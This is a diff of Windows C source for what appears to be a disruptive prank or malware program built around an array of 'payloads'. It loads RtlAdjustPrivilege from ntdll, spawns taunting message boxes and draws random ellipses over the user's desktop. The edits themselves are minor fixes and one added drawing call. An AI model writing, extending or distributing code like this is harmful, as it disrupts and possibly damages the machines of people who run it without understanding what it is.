@@ -72,6 +72,8 @@ INT WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpStr, IN
         p2,
         p3
     }; // use: payloads[x]() for function px(). why use this? functions in random order, im still working on porting all payloads to payloads.h
+    
+    DWORD zero = 0;
 
     HMODULE ntdll = LoadLibraryA("ntdll.dll");
     fnRtlAdjustPrivilege RtlAdjustPrivilege = (fnRtlAdjustPrivilege)GetProcAddress(ntdll, "RtlAdjustPrivilege");
@@ -167,9 +169,12 @@ INT WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpStr, IN
     msg5.lpszText = "that was only round 1, have a little braek"; //typo intentional
     msg5.lpszCaption = "get ready";
     msg5.dwStyle = MB_YESNO | MB_ICONQUESTION;
-    HANDLE hmsg4 = CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)MessageBoxIndirect, &msg5, NULL, NULL);
+    HANDLE hmsg4 = CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)MessageBoxIndirect, &msg5, 0, &zero);
 
+    Ellipse(desk, rand() % w, rand() % h, rand() % w, rand() % h);
+    
     Sleep(10000);
+    
     Ellipse(desk, rand() % w, rand() % h, rand() % w, rand() % h);
     
     fori(50) {
